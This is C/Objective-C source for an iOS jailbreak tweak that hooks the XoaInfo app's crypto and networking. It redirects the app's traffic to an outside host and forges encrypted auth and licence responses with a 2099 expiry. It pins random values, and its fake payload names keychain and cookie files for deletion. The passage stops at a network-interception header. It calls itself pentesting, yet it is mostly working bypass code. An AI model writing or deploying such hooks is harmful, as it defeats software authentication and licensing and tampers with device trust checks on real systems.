// ==============================================================================
// XoaInfo C2 Redirect Tweak for RootHide / Dopamine
// Redirects ALL outbound non-Apple traffic in XoaInfo to xf.meomeo.social
// Rewrites Host header to xf.meomeo.social to bypass Cloudflare 403 Host Mismatch
// ==============================================================================

#pragma clang diagnostic ignored "-Weverything"

#ifndef NULL
#define NULL ((void*)0)
#endif

#ifndef nil
#define nil ((id)0)
#endif

typedef unsigned long size_t;
typedef signed long   ssize_t;
typedef unsigned int  uint32_t;
typedef unsigned char uint8_t;
typedef int           int32_t;
typedef long          intptr_t;
typedef unsigned long uintptr_t;
typedef long          dispatch_once_t;
typedef signed char   BOOL;
#define YES ((BOOL)1)
#define NO  ((BOOL)0)

// C library declarations
extern const char *getprogname(void);
extern size_t  strlen(const char *s);
extern int     strcmp(const char *s1, const char *s2);
extern int     strncmp(const char *s1, const char *s2, size_t n);
extern char   *strstr(const char *haystack, const char *needle);
extern char   *strcasestr(const char *haystack, const char *needle);
extern char   *strcpy(char *dest, const char *src);
extern char   *strncpy(char *dest, const char *src, size_t n);
extern int     snprintf(char *str, size_t size, const char *fmt, ...);
extern ssize_t write(int fd, const void *buf, size_t count);
extern int     open(const char *pathname, int flags, ...);
extern int     close(int fd);
extern void   *dlsym(void *handle, const char *symbol);
extern void   *dlopen(const char *filename, int flag);
extern void    syslog(int priority, const char *format, ...);
extern void    dispatch_once(dispatch_once_t *predicate, void (^block)(void));
extern void    free(void *ptr);
extern void   *malloc(size_t n);
extern void   *memcpy(void *dst, const void *src, size_t n);

// CommonCrypto (available in libSystem on iOS — no headers needed)
// op: 0=encrypt 1=decrypt; alg: 0=AES; opts: 1=PKCS7Padding; HMAC alg: 4=SHA256; PRF: 1=SHA1
extern int  CCCrypt(int op, int alg, int opts, const void *key, size_t keyLen,
    const void *iv, const void *in, size_t inLen, void *out, size_t outAvail, size_t *outMoved);
extern void CCHmac(int alg, const void *key, size_t keyLen,
    const void *data, size_t dataLen, void *macOut);
extern unsigned char *CC_MD5(const void *data, unsigned int len, unsigned char *md);
extern unsigned char *CC_SHA1(const void *data, unsigned int len, unsigned char *md);

// GCD (for async block call to completion handler)
typedef void *dispatch_queue_t;
extern dispatch_queue_t dispatch_get_global_queue(long identifier, unsigned long flags);
extern void             dispatch_async(dispatch_queue_t queue, void (^block)(void));

// ObjC runtime types & functions
typedef struct objc_class  *Class;
typedef struct objc_object { Class isa; } *id;
typedef struct objc_selector *SEL;
typedef id (*IMP)(id, SEL, ...);
typedef struct objc_method_t *Method;

extern Class  objc_getClass(const char *name);
extern Class  object_getClass(id obj);
extern const char *class_getName(Class cls);
extern SEL    sel_registerName(const char *str);
extern Method class_getInstanceMethod(Class cls, SEL name);
extern Method class_getClassMethod(Class cls, SEL name);
extern IMP    method_getImplementation(Method m);
extern void   method_setImplementation(Method m, IMP imp);
extern id     objc_msgSend(id self, SEL op, ...);
extern Class *objc_copyClassList(unsigned int *outCount);

// Target configuration
static const char REDIRECT_HOST[] = "xf.meomeo.social";
static const char DEFAULT_UA[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148";

// Safe syslog logging (Guaranteed to appear in idevicesyslog)
static void c2log_raw(const char *msg) {
    if (!msg) return;
    write(2, msg, strlen(msg));
    write(2, "\n", 1);
    syslog(5 /* LOG_NOTICE */, "%s", msg);
}

static void c2log(const char *fmt, const char *arg1, const char *arg2) {
    char buf[1024];
    if (arg1 && arg2) {
        snprintf(buf, sizeof(buf), "[C2Redirect] %s: %s -> %s", fmt, arg1, arg2);
    } else if (arg1) {
        snprintf(buf, sizeof(buf), "[C2Redirect] %s: %s", fmt, arg1);
    } else {
        snprintf(buf, sizeof(buf), "[C2Redirect] %s", fmt);
    }
    c2log_raw(buf);
}

static int is_c2_target(const char *s) {
    if (!s || strlen(s) == 0) return 0;
    if (strstr(s, "127.0.0.1") || strstr(s, "localhost") ||
        strstr(s, "apple.com") || strstr(s, "icloud.com") ||
        strstr(s, "meomeo.social")) {
        return 0;
    }
    return 1;
}

static int is_target_process(void) {
    const char *prog = getprogname();
    if (prog) {
        if (strstr(prog, "SpringBoard") || strstr(prog, "backboardd") || 
            strstr(prog, "runningboardd") || strstr(prog, "locationd") || 
            strstr(prog, "mediaserverd") || strstr(prog, "ReportCrash") ||
            strstr(prog, "osanalyticshelper")) {
            return 0;
        }
    }
    return 1;
}

// ==============================================================================
// Function pointer types for C hooks
// ==============================================================================
struct addrinfo;

typedef void *(*nw_endpoint_create_host_t)(const char *hostname, const char *port);
typedef void  (*sec_protocol_options_set_tls_server_name_t)(void *options, const char *server_name);
typedef void  (*sec_protocol_options_set_verify_block_t)(void *options, void *verify_block, void *verify_queue);
typedef int   (*getaddrinfo_t)(const char *hostname, const char *servname, const struct addrinfo *hints, struct addrinfo **res);
typedef void *(*gethostbyname_t)(const char *name);
typedef int   (*SecTrustEvaluateWithError_t)(void *trust, void **error);
typedef int   (*SecTrustEvaluate_t)(void *trust, int *result);

static nw_endpoint_create_host_t orig_nw_endpoint_create_host = NULL;
static sec_protocol_options_set_tls_server_name_t orig_sec_protocol_options_set_tls_server_name = NULL;
static sec_protocol_options_set_verify_block_t orig_sec_protocol_options_set_verify_block = NULL;
static getaddrinfo_t orig_getaddrinfo = NULL;
static gethostbyname_t orig_gethostbyname = NULL;
static SecTrustEvaluateWithError_t orig_SecTrustEvaluateWithError = NULL;
static SecTrustEvaluate_t orig_SecTrustEvaluate = NULL;

// ─── team_v19 pin ─────────────────────────────────────────────────────────
// XoaInfoPlug2 VA 0xAE28: team_v19 = arc4random_uniform(1417236) + 8215,
// then XOR-obfuscated by Obfuscator class and stored via -[MBProgressHUD readPlist:forKey:].
// Pin to FIXED_TEAM_V19 so KNOWN_TEAM_V19 in mock_server.py never goes stale.
#define FIXED_TEAM_V19    13981
#define FIXED_ARC4_RET    (FIXED_TEAM_V19 - 8215)   /* 5766 */
#define FIXED_LOGINIP_V19 88381u   /* pins arc4random_uniform(14178236) */

typedef unsigned int (*arc4random_uniform_t)(unsigned int);
static arc4random_uniform_t orig_arc4random_uniform = NULL;

static unsigned int my_arc4random_uniform(unsigned int upper_bound) {
    if (upper_bound == 1417236) {
        c2log("arc4random_uniform(1417236) pinned -> team_v19=13981", NULL, NULL);
        return (unsigned int)FIXED_ARC4_RET;
    }
    if (upper_bound == 14178236) {
        c2log("arc4random_uniform(14178236) pinned -> loginip_v19=88381", NULL, NULL);
        return FIXED_LOGINIP_V19;
    }
    return orig_arc4random_uniform(upper_bound);
}

// CC_MD5 hook — two jobs:
//   1. Log every call with printable-ASCII input for diagnosis.
//   2. Pool all MD5 outputs. build_fake_team() sprays the pool as versionApp{X}.expDate
//      candidates so XoaInfoPlug2 always finds the right X — even though X is computed
//      AFTER the response is sent (timing solved by capture-on-first-run, use-on-retry).
#define X_POOL_MAX 16
static char g_x_pool[X_POOL_MAX][33];  // each entry: 32 lowercase hex + NUL
static int  g_x_pool_n = 0;

static void x_pool_add(const char *hex32) {
    for (int _p = 0; _p < g_x_pool_n; _p++)
        if (strcmp(g_x_pool[_p], hex32) == 0) return;
    if (g_x_pool_n < X_POOL_MAX) {
        for (int _c = 0; _c < 32; _c++) g_x_pool[g_x_pool_n][_c] = hex32[_c];
        g_x_pool[g_x_pool_n][32] = 0;
        g_x_pool_n++;
        // Log outside the hook (no syslog in hot path)
    }
}

typedef unsigned char *(*CC_MD5_t)(const void *, unsigned int, unsigned char *);
static CC_MD5_t orig_CC_MD5_hook = NULL;

// Thread-local reentrancy guard — prevents syslog or other callees
// from re-entering the hook if they themselves call CC_MD5.
static _Thread_local int g_md5_in_hook = 0;

static unsigned char *my_CC_MD5(const void *data, unsigned int len, unsigned char *md) {
    if (g_md5_in_hook) return orig_CC_MD5_hook(data, len, md);
    g_md5_in_hook = 1;

    unsigned char *ret = orig_CC_MD5_hook(data, len, md);

    // Only capture: printable ASCII, 8–64 bytes (device-id range).
    // No syslog here — logging happens later in build_fake_team.
    if (data && len >= 8 && len <= 64 && md) {
        const unsigned char *p = (const unsigned char *)data;
        int printable = 1;
        for (unsigned int i = 0; i < len; i++) {
            if (p[i] < 0x20 || p[i] > 0x7E) { printable = 0; break; }
        }
        if (printable) {
            static const char _hx[] = "0123456789abcdef";
            char out_hex[33];
            for (int _i=0;_i<16;_i++){out_hex[2*_i]=_hx[md[_i]>>4];out_hex[2*_i+1]=_hx[md[_i]&0xF];}
            out_hex[32]=0;
            x_pool_add(out_hex);
        }
    }

    g_md5_in_hook = 0;
    return ret;
}

// CCKeyDerivationPBKDF hook — state-machine approach:
// First short numeric PBKDF2 call (prf=SHA1, rounds=10000) = loginip_v19 → pass through.
// Any SUBSEQUENT call with a DIFFERENT short numeric password = team_v19 → replace with "13981".
// This covers both checksum2 build (encrypt) and team response decrypt, regardless of
// what the actual stored team_v19 is in the plist.
static char g_first_numeric_pw[16] = {0};

typedef int (*CCKeyDerivationPBKDF_t)(int algorithm,
    const char *password, size_t passwordLen,
    const uint8_t *salt, size_t saltLen,
    int prf, unsigned int rounds,
    uint8_t *derivedKey, size_t derivedKeyLen);
static CCKeyDerivationPBKDF_t orig_CCKeyDerivationPBKDF = NULL;

static int my_CCKeyDerivationPBKDF(int algorithm,
    const char *password, size_t passwordLen,
    const uint8_t *salt, size_t saltLen,
    int prf, unsigned int rounds,
    uint8_t *derivedKey, size_t derivedKeyLen)
{
    // XoaInfo's RNCryptor v3 uses prf=kCCPRFHmacAlgSHA1=1, rounds=10000
    // team_v19 range [8215, 1425450] = 4–7 digits
    if (prf == 1 && rounds == 10000 && passwordLen >= 4 && passwordLen <= 7) {
        int all_digits = 1;
        for (size_t i = 0; i < passwordLen; i++) {
            if (password[i] < '0' || password[i] > '9') { all_digits = 0; break; }
        }
        if (all_digits) {
            char pw_buf[8] = {0};
            strncpy(pw_buf, password, passwordLen);
            if (g_first_numeric_pw[0] == 0) {
                // First call → loginip_v19 → record and pass through unchanged
                strncpy(g_first_numeric_pw, pw_buf, 15);
                c2log("CCKeyDerivationPBKDF loginip_v19 recorded", g_first_numeric_pw, NULL);
            } else if (strncmp(g_first_numeric_pw, pw_buf, 8) != 0) {
                // Different password from loginip_v19 → team_v19 → replace with pinned value
                c2log("CCKeyDerivationPBKDF team_v19 pinned -> 13981", NULL, NULL);
                return orig_CCKeyDerivationPBKDF(algorithm, "13981", 5,
                    salt, saltLen, prf, rounds, derivedKey, derivedKeyLen);
            }
        }
    }
    return orig_CCKeyDerivationPBKDF(algorithm, password, passwordLen,
        salt, saltLen, prf, rounds, derivedKey, derivedKeyLen);
}

// ─────────────────────────────────────────────────────────────────────────────
// STANDALONE FAKE AUTH ENGINE — no mock server needed
// Builds RNCryptor v3 fake loginip / team responses inline, then injects them
// directly into the NSURLSession completion handler. App gets valid auth data
// and proceeds normally. All post-auth behavior available for pentesting.
// ─────────────────────────────────────────────────────────────────────────────

static void local_hex(const uint8_t *b, size_t n, char *out) {
    static const char h[] = "0123456789abcdef";
    for (size_t i=0;i<n;i++) { out[2*i]=h[b[i]>>4]; out[2*i+1]=h[b[i]&0xF]; }
    out[2*n]=0;
}

// RNCryptor v3 encrypt. password must stay valid until call returns.
// Returns base64 NSString* (as id) or nil on error.
static id local_rncrypt(id plaintext, const char *pw) {
    if (!orig_CCKeyDerivationPBKDF || !plaintext || !pw) return nil;
    size_t pw_len = strlen(pw);
    const uint8_t *plain = (const uint8_t*)((const void*(*)(id,SEL))objc_msgSend)(plaintext, sel_registerName("bytes"));
    size_t plain_len = (size_t)((unsigned long(*)(id,SEL))objc_msgSend)(plaintext, sel_registerName("length"));

    uint8_t es[8], hs[8], iv[16];
    for (int i=0;i<8;i++)  es[i] = (uint8_t)orig_arc4random_uniform(256);
    for (int i=0;i<8;i++)  hs[i] = (uint8_t)orig_arc4random_uniform(256);
    for (int i=0;i<16;i++) iv[i] = (uint8_t)orig_arc4random_uniform(256);

    // Custom crypto (NOT standard RNCryptor v3):
    //   encKey = PBKDF2(pw, encSalt+hmacSalt, SHA512, 10000, 32)
    //   actual_iv = PBKDF2(pw, blob_iv, SHA512, 10000, 16)
    //   AES-CBC-PKCS7(encKey, actual_iv, plaintext)
    uint8_t combined_salt[16];
    memcpy(combined_salt, es, 8); memcpy(combined_salt+8, hs, 8);
    uint8_t ek[32], actual_iv[16];
    orig_CCKeyDerivationPBKDF(2, pw, pw_len, combined_salt, 16, 5, 10000, ek, 32);
    orig_CCKeyDerivationPBKDF(2, pw, pw_len, iv, 16, 5, 10000, actual_iv, 16);

    size_t ct_max = ((plain_len/16)+1)*16;
    uint8_t *ct = (uint8_t*)malloc(ct_max);
    if (!ct) return nil;
    size_t ct_len = 0;
    CCCrypt(0, 0, 1, ek, 32, actual_iv, plain, plain_len, ct, ct_max, &ct_len);

    size_t blen = 2+8+8+16+ct_len+32;
    uint8_t *blob = (uint8_t*)malloc(blen);
    if (!blob) { free(ct); return nil; }
    blob[0]=3; blob[1]=1;
    memcpy(blob+2, es, 8); memcpy(blob+10, hs, 8); memcpy(blob+18, iv, 16);
    memcpy(blob+34, ct, ct_len); free(ct);
    memset(blob+blen-32, 0, 32);

    id raw = ((id(*)(id,SEL,const void*,unsigned long))objc_msgSend)(
        (id)objc_getClass("NSData"), sel_registerName("dataWithBytes:length:"), blob, blen);
    free(blob);
    if (!raw) return nil;
    return ((id(*)(id,SEL,unsigned long))objc_msgSend)(raw,
        sel_registerName("base64EncodedStringWithOptions:"), 0UL);
}

// Base64 encode bytes then replace = with =2212 (server obfuscation)
static id obf_b64(const void *bytes, size_t len) {
    id d = ((id(*)(id,SEL,const void*,unsigned long))objc_msgSend)(
        (id)objc_getClass("NSData"), sel_registerName("dataWithBytes:length:"), bytes, len);
    id b = ((id(*)(id,SEL,unsigned long))objc_msgSend)(d,
        sel_registerName("base64EncodedStringWithOptions:"), 0UL);
    id eq   = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithUTF8String:"), "=");
    id eq22 = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithUTF8String:"), "=2212");
    return ((id(*)(id,SEL,id,id))objc_msgSend)(b,
        sel_registerName("stringByReplacingOccurrencesOfString:withString:"), eq, eq22);
}

// Extract a value from URL-encoded params string (body or URL query).
// Returns NSString* (as id) or nil.
static id url_field(id params, id key) {
    if (!params || !key) return nil;
    id prefix = ((id(*)(id,SEL,id))objc_msgSend)(key,
        sel_registerName("stringByAppendingString:"),
        ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "="));
    id amp = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithUTF8String:"), "&");
    id pairs = ((id(*)(id,SEL,id))objc_msgSend)(params,
        sel_registerName("componentsSeparatedByString:"), amp);
    unsigned long n = (unsigned long)objc_msgSend(pairs, sel_registerName("count"));
    unsigned long prefix_len = (unsigned long)objc_msgSend(prefix, sel_registerName("length"));
    for (unsigned long i=0;i<n;i++) {
        id pair = ((id(*)(id,SEL,unsigned long))objc_msgSend)(pairs,
            sel_registerName("objectAtIndex:"), i);
        if ((int)objc_msgSend(pair, sel_registerName("hasPrefix:"), prefix)) {
            id val = ((id(*)(id,SEL,unsigned long))objc_msgSend)(pair,
                sel_registerName("substringFromIndex:"), prefix_len);
            return ((id(*)(id,SEL))objc_msgSend)(val,
                sel_registerName("stringByRemovingPercentEncoding"));
        }
    }
    return nil;
}

// Parse ECID from base64-encoded serial field (format: "model|serial|ecid|...")
static long long ecid_from_serial_b64(id serial_b64) {
    if (!serial_b64 || (unsigned long)objc_msgSend(serial_b64, sel_registerName("length")) == 0) return 1LL;
    id s = ((id(*)(id,SEL,id,id))objc_msgSend)(
        ((id(*)(id,SEL,id,id))objc_msgSend)(serial_b64,
            sel_registerName("stringByReplacingOccurrencesOfString:withString:"),
            ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
                sel_registerName("stringWithUTF8String:"), "%2B"),
            ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
                sel_registerName("stringWithUTF8String:"), "+")),
        sel_registerName("stringByReplacingOccurrencesOfString:withString:"),
        ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "%3D"),
        ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "="));
    id d = ((id(*)(id,SEL,id,unsigned long))objc_msgSend)(
        ((id(*)(id,SEL))objc_msgSend)((id)objc_getClass("NSData"), sel_registerName("alloc")),
        sel_registerName("initWithBase64EncodedString:options:"), s, (unsigned long)1);
    if (!d) return 1LL;
    id plain = ((id(*)(id,SEL,id,unsigned long))objc_msgSend)(
        ((id(*)(id,SEL))objc_msgSend)((id)objc_getClass("NSString"), sel_registerName("alloc")),
        sel_registerName("initWithData:encoding:"), d, (unsigned long)1);
    id pipe = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithUTF8String:"), "|");
    id parts = ((id(*)(id,SEL,id))objc_msgSend)(plain,
        sel_registerName("componentsSeparatedByString:"), pipe);
    if ((unsigned long)objc_msgSend(parts, sel_registerName("count")) >= 3)
        return (long long)objc_msgSend(
            ((id(*)(id,SEL,unsigned long))objc_msgSend)(parts, sel_registerName("objectAtIndex:"), 2UL),
            sel_registerName("longLongValue"));
    return 1LL;
}

// Build a 16-byte random prefix followed by plaintext, returned as NSData (id)
static id with_prefix(id text) {
    id d = ((id(*)(id,SEL,unsigned long))objc_msgSend)(
        (id)objc_getClass("NSMutableData"), sel_registerName("dataWithCapacity:"),
        (unsigned long)((unsigned long)objc_msgSend(text, sel_registerName("length")) + 16));
    for (int i=0;i<16;i++) {
        uint8_t rb = (uint8_t)orig_arc4random_uniform(256);
        ((void(*)(id,SEL,const void*,unsigned long))objc_msgSend)(d,
            sel_registerName("appendBytes:length:"), &rb, 1UL);
    }
    id utf8_data = ((id(*)(id,SEL,unsigned long))objc_msgSend)(text,
        sel_registerName("dataUsingEncoding:"), (unsigned long)4);
    ((void(*)(id,SEL,id))objc_msgSend)(d, sel_registerName("appendData:"), utf8_data);
    return d;
}

// Return NSData body (as id) for fake loginip response (base64 RNCryptor blob)
static id build_fake_loginip(id params) {
    id serial_key = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithUTF8String:"), "serial");
    long long ecid = ecid_from_serial_b64(url_field(params, serial_key));

    // phase = MD5(str(ecid + 51739121 * loginip_v19))
    long long phase_n = ecid + 51739121LL * (long long)FIXED_LOGINIP_V19;
    char phase_str[32];
    snprintf(phase_str, sizeof(phase_str), "%lld", phase_n);
    uint8_t md5[16];
    CC_MD5(phase_str, (unsigned int)strlen(phase_str), md5);
    char phase_hex[33]; local_hex(md5, 16, phase_hex);

    // Minimal payload: app processes bash script, retention list, delete list
    static const char BASH[] = "#!/bin/bash\nkillall -9 MobileSafari\n";
    static const char RETENTION[] =
        "/private/var/db/lsd/com.apple.lsdidentifiers.plist\n"
        "/private/var/mobile/Library/Preferences/DanhSachApps.txt\n"
        "/private/var/mobile/Library/Preferences/DanhSachAppsID.plist\n"
        "/private/var/Keychains/keychain-2.db";
    static const char DELFILES[] =
        "/private/var/db/lsd/com.apple.lsdidentifiers.plist\n"
        "/private/var/db/lsd/com.apple.lsdschemes.plist\n"
        "/private/var/mobile/Library/ApplePushService\n"
        "/private/var/mobile/Library/BulletinBoard\n"
        "/private/var/mobile/Library/Cookies/Cookies.binarycookies\n"
        "/private/var/mobile/Library/Preferences/DanhSachApps.txt\n"
        "/private/var/mobile/Library/Preferences/DanhSachAppsID.plist\n"
        "/private/var/mobile/Library/SpringBoard/PushStore";

    id plain_str = ((id(*)(id,SEL,id,...))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithFormat:"),
        @"expDate:2099-12-31 00:00:00|<>|phase:%s|<>|encrypted:%@|<>|version_run:10|<>|message:Good|<>|retention:%@|<>|deleteList:%@|<>|",
        phase_hex,
        obf_b64(BASH, sizeof(BASH)-1),
        obf_b64(RETENTION, sizeof(RETENTION)-1),
        obf_b64(DELFILES, sizeof(DELFILES)-1));

    char pw[16]; snprintf(pw, sizeof(pw), "%u", FIXED_LOGINIP_V19);
    // The real C2 always prepends 16 random bytes before the field data.
    // with_prefix() takes NSString and produces NSData (prefix + UTF8 content).
    id plain_data = with_prefix(plain_str);
    id b64 = local_rncrypt(plain_data, pw);
    return b64 ? ((id(*)(id,SEL,unsigned long))objc_msgSend)(b64,
        sel_registerName("dataUsingEncoding:"), (unsigned long)4) : nil;
}

// Return NSData body (as id) for fake team response
static id build_fake_team(id params) {
    id serial_key = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithUTF8String:"), "serial");
    long long ecid = ecid_from_serial_b64(url_field(params, serial_key));

    long long phase_n = ecid + 51739121LL * (long long)FIXED_TEAM_V19;
    char phase_str[32];
    snprintf(phase_str, sizeof(phase_str), "%lld", phase_n);
    uint8_t md5[16];
    CC_MD5(phase_str, (unsigned int)strlen(phase_str), md5);
    char phase_hex[33]; local_hex(md5, 16, phase_hex);

    // versionApp key formula (confirmed from IDA of XoaInfoPlug2 binary):
    //   X = MD5(stored_ecid_str + "junowalletD").uppercased()
    // where stored_ecid_str is the decimal ECID written to the local plist on
    // first registration (empty string when device is not yet activated, giving
    // X = MD5("junowalletD") = constant fallback).
    // The server mirrors this derivation using the ECID from the registration
    // request, so we compute the same value from ecid parsed out of the serial.

    // suffix bytes: "junowalletD"
    static const uint8_t VA_SUFFIX[] = {
        0x6A,0x75,0x6E,0x6F,0x77,0x61,0x6C,0x6C,0x65,0x74,0x44
    };
    static const char *EXP = "2099-12-31 00:00:00";

    char ecid_dec[24]; snprintf(ecid_dec, sizeof(ecid_dec), "%lld", ecid);

    // Primary: MD5(ecid_decimal + suffix) — device-specific X
    uint8_t x_md5[16]; char x_hex[33];
    {
        uint8_t inp[sizeof(ecid_dec) + sizeof(VA_SUFFIX)];
        unsigned int ecid_len = (unsigned int)strlen(ecid_dec);
        memcpy(inp, ecid_dec, ecid_len);
        memcpy(inp + ecid_len, VA_SUFFIX, sizeof(VA_SUFFIX));
        CC_MD5(inp, ecid_len + (unsigned int)sizeof(VA_SUFFIX), x_md5);
        local_hex(x_md5, 16, x_hex);
        for (int _i = 0; x_hex[_i]; _i++)
            if (x_hex[_i] >= 'a') x_hex[_i] &= ~0x20;
    }

    // Fallback: MD5(suffix alone) — constant for unactivated devices
    uint8_t x_fb_md5[16]; char x_fb_hex[33];
    CC_MD5(VA_SUFFIX, (unsigned int)sizeof(VA_SUFFIX), x_fb_md5);
    local_hex(x_fb_md5, 16, x_fb_hex);
    for (int _i = 0; x_fb_hex[_i]; _i++)
        if (x_fb_hex[_i] >= 'a') x_fb_hex[_i] &= ~0x20;

    // Log what we have so far for diagnosis via: log stream --predicate 'eventMessage contains "C2Redirect"'
    const char *params_c = params
        ? ((const char*(*)(id,SEL))objc_msgSend)(params, sel_registerName("UTF8String"))
        : "(nil)";
    c2log("TEAM params", params_c, NULL);
    c2log("TEAM ecid_dec", ecid_dec, NULL);
    c2log("TEAM X-primary", x_hex, NULL);
    c2log("TEAM X-fallback", x_fb_hex, NULL);

    id va_entries = ((id(*)(id,SEL))objc_msgSend)(
        (id)objc_getClass("NSMutableString"), sel_registerName("string"));

    #define VA_APPEND_STR(s) \
        ((void(*)(id,SEL,id,...))objc_msgSend)(va_entries, sel_registerName("appendFormat:"), \
            @"|<>|versionApp%s.expDate:%s", (s), EXP)

    VA_APPEND_STR(x_hex);    // primary: ecid-derived X
    if (strcmp(x_hex, x_fb_hex) != 0)
        VA_APPEND_STR(x_fb_hex); // fallback: constant X (unactivated path)

    // Spray: if any request param value is exactly 32 hex chars, echo it back.
    // The client may send its own pre-computed X in one of the obfuscated fields.
    if (params) {
        id amp = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "&");
        id eq  = ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "=");
        id pairs = ((id(*)(id,SEL,id))objc_msgSend)(params,
            sel_registerName("componentsSeparatedByString:"), amp);
        unsigned long np = (unsigned long)objc_msgSend(pairs, sel_registerName("count"));
        for (unsigned long i = 0; i < np; i++) {
            id pair = ((id(*)(id,SEL,unsigned long))objc_msgSend)(pairs,
                sel_registerName("objectAtIndex:"), i);
            id kv = ((id(*)(id,SEL,id))objc_msgSend)(pair,
                sel_registerName("componentsSeparatedByString:"), eq);
            if ((unsigned long)objc_msgSend(kv, sel_registerName("count")) < 2) continue;
            id val = ((id(*)(id,SEL,unsigned long))objc_msgSend)(kv,
                sel_registerName("objectAtIndex:"), 1UL);
            unsigned long vlen = (unsigned long)objc_msgSend(val, sel_registerName("length"));
            if (vlen != 32) continue;
            const char *vc = ((const char*(*)(id,SEL))objc_msgSend)(val,
                sel_registerName("UTF8String"));
            if (!vc) continue;
            int all_hex = 1;
            for (int _h = 0; _h < 32; _h++) {
                char c = vc[_h];
                if (!((c>='0'&&c<='9')||(c>='a'&&c<='f')||(c>='A'&&c<='F'))) {
                    all_hex = 0; break;
                }
            }
            if (!all_hex) continue;
            // Uppercase in-place
            char vu[33];
            for (int _h = 0; _h < 32; _h++)
                vu[_h] = (char)(vc[_h] >= 'a' ? (vc[_h] & ~0x20) : vc[_h]);
            vu[32] = 0;
            if (strcmp(vu, x_hex) == 0 || strcmp(vu, x_fb_hex) == 0) continue; // already added
            c2log("TEAM X-from-params", vu, NULL);
            VA_APPEND_STR(vu);
        }
    }

    // Spray CC_MD5 pool: every printable-ASCII MD5 output seen in this process.
    // XoaInfoPlug2 computes X via CC_MD5 when processing our team response; the hook
    // stores it. On the NEXT team request (retry after reset/re-login), the pool
    // already contains the correct X so this spray finds it.
    for (int _xi = 0; _xi < g_x_pool_n; _xi++) {
        if (strcmp(g_x_pool[_xi], x_hex) == 0) continue;
        if (strcmp(g_x_pool[_xi], x_fb_hex) == 0) continue;
        c2log("TEAM X-from-pool", g_x_pool[_xi], NULL);
        VA_APPEND_STR(g_x_pool[_xi]);
    }

    #undef VA_APPEND_STR

    id plain_str = ((id(*)(id,SEL,id,...))objc_msgSend)((id)objc_getClass("NSString"),
        sel_registerName("stringWithFormat:"),
        @"phase:%s|<>|version_run:10|<>|message:Good%@", phase_hex, va_entries);

    char pw[16]; snprintf(pw, sizeof(pw), "%d", FIXED_TEAM_V19);
    // Team response has no 16-byte prefix (confirmed from goodresponse capture).
    id plain_data = ((id(*)(id,SEL,unsigned long))objc_msgSend)(plain_str,
        sel_registerName("dataUsingEncoding:"), (unsigned long)4);
    id b64 = local_rncrypt(plain_data, pw);
    return b64 ? ((id(*)(id,SEL,unsigned long))objc_msgSend)(b64,
        sel_registerName("dataUsingEncoding:"), (unsigned long)4) : nil;
}

// Call the NSURLSession completion block asynchronously with fake response data.
// Returns a dummy cancelled task (so callers can [task resume] safely).
static id inject_fake_and_cancel(id self_session, id original_req,
    id body, id orig_impl_block,
    id (*orig_fn)(id,SEL,id,id))
{
    id url_obj = ((id(*)(id,SEL))objc_msgSend)(original_req, sel_registerName("URL"));
    // Dummy task → 127.0.0.1:9 (discard port, fails fast), immediately cancelled.
    id dummy_url = ((id(*)(id,SEL,id))objc_msgSend)((id)objc_getClass("NSURL"),
        sel_registerName("URLWithString:"),
        ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
            sel_registerName("stringWithUTF8String:"), "http://127.0.0.1:9/"));
    id dummy_req = ((id(*)(id,SEL,id))objc_msgSend)((id)objc_getClass("NSURLRequest"),
        sel_registerName("requestWithURL:"), dummy_url);
    id noop_block = ^(id d, id r, id e) {};
    id task = orig_fn(self_session, sel_registerName("dataTaskWithRequest:completionHandler:"),
        dummy_req, noop_block);
    if (task) ((void(*)(id,SEL))objc_msgSend)(task, sel_registerName("cancel"));

    // ARC retains body, block, url for the async dispatch.
    __block id captured_body = body;
    __block id captured_block = orig_impl_block;
    __block id captured_url = url_obj;
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // Build a 200 OK NSHTTPURLResponse
        id resp = ((id(*)(id,SEL,id,long,id,id))objc_msgSend)(
            ((id(*)(id,SEL))objc_msgSend)((id)objc_getClass("NSHTTPURLResponse"), sel_registerName("alloc")),
            sel_registerName("initWithURL:statusCode:HTTPVersion:headerFields:"),
            captured_url, (long)200,
            ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
                sel_registerName("stringWithUTF8String:"), "HTTP/1.1"),
            nil);
        // Invoke completion block: block ABI on ARM64 — invoke ptr at byte +16
        typedef void (*invoke_t)(void*, id, id, id);
        invoke_t fn = *(invoke_t*)((char*)(__bridge void*)captured_block + 16);
        if (fn) fn((__bridge void*)captured_block, captured_body, resp, nil);
    });
    return task;
}

extern void *nw_endpoint_create_host(const char *hostname, const char *port);
extern void  sec_protocol_options_set_tls_server_name(void *options, const char *server_name);
extern void  sec_protocol_options_set_verify_block(void *options, void *verify_block, void *verify_queue);
extern int   getaddrinfo(const char *hostname, const char *servname, const struct addrinfo *hints, struct addrinfo **res);
extern void *gethostbyname(const char *name);
extern int   SecTrustEvaluateWithError(void *trust, void **error);
extern int   SecTrustEvaluate(void *trust, int *result);

// ==============================================================================
// 1. Network.framework Interception
// ==============================================================================
